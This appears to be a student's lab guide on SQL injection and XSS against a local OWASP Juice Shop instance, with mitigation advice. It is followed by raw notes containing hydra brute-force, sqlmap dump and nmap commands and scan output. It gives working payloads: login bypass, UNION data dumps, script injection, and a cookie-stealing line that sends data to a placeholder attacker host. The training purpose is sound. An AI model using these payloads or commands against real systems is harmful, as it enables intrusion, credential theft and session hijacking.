# SQL Injection (SQLi) and Cross-Site Scripting (XSS) Attack Guide

## Introduction
This document provides a dummy, educational guide on step-by-step instructions for demonstrating SQL Injection (SQLi) and Cross-Site Scripting (XSS) attacks using the OWASP Juice Shop application. This is intended for learning purposes only in a controlled, local environment. Do not use these techniques on real websites without permission, as that would be illegal and unethical.

OWASP Juice Shop is a deliberately insecure web app designed for security training. Assumptions:
- You have Juice Shop running locally (e.g., via Docker: `docker run --rm -p 3000:3000 bkimminich/juice-shop`).
- Access it at http://localhost:3000.
- All steps are for demonstration; in a real project, document with screenshots.

References:
- OWASP Top 10: https://owasp.org/www-project-top-ten/
- Juice Shop Challenges: https://pwning.owasp-juice.shop/part2/challenges.html

## Section 1: SQL Injection (SQLi)
SQLi exploits poor input handling by injecting malicious SQL code into queries, potentially allowing data access, modification, or deletion.

### High-Level Overview
1. Identify input fields that interact with the database (e.g., login, search).
2. Test with probes to detect vulnerabilities (e.g., error messages).
3. Exploit by crafting payloads to bypass auth or extract data.
4. Mitigate with prepared statements, input validation.

### Step-by-Step Dummy Instructions for Demonstration
#### Step 1: Setup and Identification
- Launch Juice Shop and navigate to the login page.
- Enter a single quote (') in the email field and submit. Look for error messages like "SQLITE_ERROR" indicating vulnerability.

#### Step 2: Basic Authentication Bypass (Union-Based SQLi)
- Go to the login page.
- In the email field, enter: `' OR 1=1 --`
- Enter any password (e.g., "test").
- Submit. This makes the query always true, logging you in as the admin user.
- Expected: Successful login without credentials.

#### Step 3: Data Extraction (Union-Based)
- Use the search bar (after logging in or as guest).
- Enter: `') UNION SELECT id, email, password_md5 FROM Users --`
- Submit. This appends a query to dump user data.
- Expected: Search results show leaked emails and hashed passwords.

#### Step 4: Blind SQLi (Time-Based or Boolean)
- In search: `%' AND (CASE WHEN (SELECT COUNT(*) FROM Users) > 0 THEN 1 ELSE (SELECT 1/0) END) --`
- Observe response differences (e.g., error vs. no error) to infer data.
- Expected: Confirms table existence without direct output.

#### Step 5: Documentation Notes
- Take screenshots of input, error messages, and results.
- Note impact: Unauthorized access, data breach.

## Section 2: Cross-Site Scripting (XSS)
XSS injects malicious scripts into web pages, executed in users' browsers, potentially stealing sessions or defacing sites.

### High-Level Overview
1. Find fields that reflect or store user input (e.g., search, comments).
2. Test with script tags to check for execution.
3. Exploit by injecting payloads that run JavaScript.
4. Mitigate with output encoding, sanitization (e.g., DOMPurify).

### Step-by-Step Dummy Instructions for Demonstration
#### Step 1: Setup and Identification
- Navigate to the search bar or customer feedback page in Juice Shop.
- Enter: `<script>alert('test')</script>`
- Submit and observe if an alert pops up, indicating no sanitization.

#### Step 2: Reflected XSS (Immediate Execution)
- In the search bar: `<script>alert('XSS Reflected')</script>`
- Submit. The script reflects back and executes.
- Expected: Alert box appears on the results page.

#### Step 3: Stored XSS (Persistent)
- Go to the "Customer Feedback" page.
- In the comment field: `<script>alert('XSS Stored')</script>`
- Submit the form.
- View the feedback as another user or refresh.
- Expected: Alert executes every time the page loads.

#### Step 4: DOM-Based XSS
- In the search bar: `<iframe src="javascript:alert('DOM XSS')"></iframe>`
- Submit. This manipulates the DOM directly.
- Expected: Alert triggers without server reflection.

#### Step 5: Advanced Payload (e.g., Session Theft)
- Inject: `<script>document.location='http://attacker.com?cookie='+document.cookie</script>`
- Expected: Simulates stealing cookies (in demo, use console to verify).

#### Step 6: Documentation Notes
- Capture browser console logs and alerts.
- Note impact: Cookie theft, phishing.

## Mitigation Strategies (For Both Attacks)
### For SQLi:
- Use parameterized queries (e.g., in Node.js: `db.query('SELECT * FROM users WHERE id = ?', [userId])`).
- Validate input: Check for expected formats (e.g., email regex).
- Sanitize: Escape special characters.

### For XSS:
- Sanitize inputs: Use libraries like DOMPurify.
- Encode outputs: HTML-encode user data before rendering.
- Add CSP headers: `Content-Security-Policy: script-src 'self'`.

## Conclusion
This guide is for educational demo only. In your project, implement fixes in a forked Juice Shop repo and re-test to show improvements. Always follow ethical hacking guidelines.

- Created: September 29, 2025
- For: Web Application Security Project (WAS621S)


hydra -l <username> -P <password_list> <ftp_server>
hydra -l admin@juice-sh.op -P /usr/share/wordlists/rockyou.txt http-post-form \
"http://localhost:3000/rest/user/login:username=^USER^&password=^PASS^:F=Login failed"

sqlmap -u "http://localhost:3000/rest/products/search?q=searchterm" --batch --dump
nmap -p- -sV -T4 localhost

Simulate CSRF attacks using curl and session tokens:   curl -X POST http://localhost:3000/rest/user/change-password \
-H "Authorization: Bearer <token>" \
-d '{"current": "123456", "new": "newpass"}'






Nmap scan report for localhost (127.0.0.1)
Host is up (0.0000070s latency).
Other addresses for localhost (not scanned): ::1
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.65
3000/tcp  open  ppp?
3306/tcp  open  mysql?
45833/tcp open  http    Golang net/http server
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3000-TCP:V=7.95%I=7%D=9/29%Time=68DAC0FF%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,101B9,"HTTP/1\.1\x20200\x20OK\r\nAccess-Control-Allow-Origin:\
SF:x20\*\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20SAME
SF:ORIGIN\r\nFeature-Policy:\x20payment\x20'self'\r\nX-Recruiting:\x20/#/j
SF:obs\r\nAccept-Ranges:\x20bytes\r\nCache-Control:\x20public,\x20max-age=
SF:0\r\nLast-Modified:\x20Mon,\x2029\x20Sep\x202025\x2015:30:12\x20GMT\r\n
SF:ETag:\x20W/\"124fa-1999618804b\"\r\nContent-Type:\x20text/html;\x20char
SF:set=UTF-8\r\nContent-Length:\x2075002\r\nVary:\x20Accept-Encoding\r\nDa
SF:te:\x20Mon,\x2029\x20Sep\x202025\x2017:25:18\x20GMT\r\nConnection:\x20c
SF:lose\r\n\r\n<!--\n\x20\x20~\x20Copyright\x20\(c\)\x202014-2025\x20Bjoer
SF:n\x20Kimminich\x20&\x20the\x20OWASP\x20Juice\x20Shop\x20contributors\.\
SF:n\x20\x20~\x20SPDX-License-Identifier:\x20MIT\n\x20\x20-->\n\n<!doctype
SF:\x20html>\n<html\x20lang=\"en\"\x20data-beasties-container>\n<head>\n\x
SF:20\x20<meta\x20charset=\"utf-8\">\n\x20\x20<title>OWASP\x20Juice\x20Sho
SF:p</title>\n\x20\x20<meta\x20name=\"description\"\x20content=\"Probably\
SF:x20the\x20most\x20modern\x20and\x20sophisticated\x20insecure\x20web\x20
SF:application\">\n\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=d
SF:evice-width,\x20initial-scale=1\">\n\x20\x20<link\x20id=\"favicon\"\x20
SF:rel=\"icon\"\x20")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
SF:nection:\x20close\r\n\r\n")%r(NCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Reques
SF:t\r\nConnection:\x20close\r\n\r\n")%r(HTTPOptions,EA,"HTTP/1\.1\x20204\
SF:x20No\x20Content\r\nAccess-Control-Allow-Origin:\x20\*\r\nAccess-Contro
SF:l-Allow-Methods:\x20GET,HEAD,PUT,PATCH,POST,DELETE\r\nVary:\x20Access-C
SF:ontrol-Request-Headers\r\nContent-Length:\x200\r\nDate:\x20Mon,\x2029\x
SF:20Sep\x202025\x2017:25:19\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RT
SF:SPRequest,EA,"HTTP/1\.1\x20204\x20No\x20Content\r\nAccess-Control-Allow
SF:-Origin:\x20\*\r\nAccess-Control-Allow-Methods:\x20GET,HEAD,PUT,PATCH,P
SF:OST,DELETE\r\nVary:\x20Access-Control-Request-Headers\r\nContent-Length
SF::\x200\r\nDate:\x20Mon,\x2029\x20Sep\x202025\x2017:25:19\x20GMT\r\nConn
SF:ection:\x20close\r\n\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3306-TCP:V=7.95%I=7%D=9/29%Time=68DAC0F9%P=x86_64-pc-linux-gnu%r(NU
SF:LL,67,"c\0\0\0\n11\.8\.3-MariaDB-1\+b1\x20from\x20Debian\0\x1f\0\0\0I}\
SF:]:I\?Ah\0\xfe\xff-\x02\0\xff\x81\x15\0\0\0\0\0\0=\0\0\0jXZ>cZwh%\|bV\0m
SF:ysql_native_password\0")%r(GenericLines,9F,"c\0\0\0\n11\.8\.3-MariaDB-1
SF:\+b1\x20from\x20Debian\0\x1f\0\0\0I}\]:I\?Ah\0\xfe\xff-\x02\0\xff\x81\x
SF:15\0\0\0\0\0\0=\0\0\0jXZ>cZwh%\|bV\0mysql_native_password\x004\0\0\x01\
SF:xffj\x04#HY000Proxy\x20header\x20is\x20not\x20accepted\x20from\x20127\.
SF:0\.0\.1")%r(LDAPBindReq,67,"c\0\0\0\n11\.8\.3-MariaDB-1\+b1\x20from\x20
SF:Debian\x000\0\0\0j`&7\$M9u\0\xfe\xff-\x02\0\xff\x81\x15\0\0\0\0\0\0=\0\
SF:0\0`aH\$yW\(\]~&<:\0mysql_native_password\0")%r(afp,67,"c\0\0\0\n11\.8\
SF:.3-MariaDB-1\+b1\x20from\x20Debian\0:\0\0\0m<\"4!Dt>\0\xfe\xff-\x02\0\x
SF:ff\x81\x15\0\0\0\0\0\0=\0\0\0uR\|9F5tj8s_b\0mysql_native_password\0");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port45833-TCP:V=7.95%I=7%D=9/29%Time=68DAC0F9%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(GetRequest,8F,"HTTP/1\.0\x20404\x20Not\x20Found\r\nDate:
SF:\x20Mon,\x2029\x20Sep\x202025\x2017:25:13\x20GMT\r\nContent-Length:\x20
SF:19\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\n404:\x20Page
SF:\x20Not\x20Found")%r(HTTPOptions,8F,"HTTP/1\.0\x20404\x20Not\x20Found\r
SF:\nDate:\x20Mon,\x2029\x20Sep\x202025\x2017:25:14\x20GMT\r\nContent-Leng
SF:th:\x2019\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\n404:\
SF:x20Page\x20Not\x20Found")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20
SF:Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:
SF:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCon
SF:nection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HT
SF:TP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20cha
SF:rset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Fou
SF:rOhFourRequest,8F,"HTTP/1\.0\x20404\x20Not\x20Found\r\nDate:\x20Mon,\x2
SF:029\x20Sep\x202025\x2017:25:29\x20GMT\r\nContent-Length:\x2019\r\nConte
SF:nt-Type:\x20text/plain;\x20charset=utf-8\r\n\r\n404:\x20Page\x20Not\x20
SF:Found")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-T
SF:ype:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400
SF:\x20Bad\x20Request")%r(SIPOptions,67,"HTTP/1\.1\x20400\x20Bad\x20Reques
SF:t\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20cl
SF:ose\r\n\r\n400\x20Bad\x20Request")%r(Socks5,67,"HTTP/1\.1\x20400\x20Bad
SF:\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnect
SF:ion:\x20close\r\n\r\n400\x20Bad\x20Request")%r(OfficeScan,A3,"HTTP/1\.1
SF:\x20400\x20Bad\x20Request:\x20missing\x20required\x20Host\x20header\r\n
SF:Content-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r
SF:\n\r\n400\x20Bad\x20Request:\x20missing\x20required\x20Host\x20header");
Service Info: Host: kali01.nust.na

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.69 seconds


hydra -s 3000 -vV -l 'admin@juice-sh.op' -P /usr/share/wordlists/rockyou.txt localhost http-post-form '/rest/user/login:email=^USER^&password=^PASS^:Invalid email or password'

hydra -s 3000 -vV -l 'admin@juice-sh.op' -P /usr/share/wordlists/rockyou.txt localhost http-post-form '/rest/user/login:username=^USER^&password=^PASS^:Invalid username or password'

curl -i -s -X POST http://localhost:3000/rest/user/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"nope@example.com","password":"bad"}'


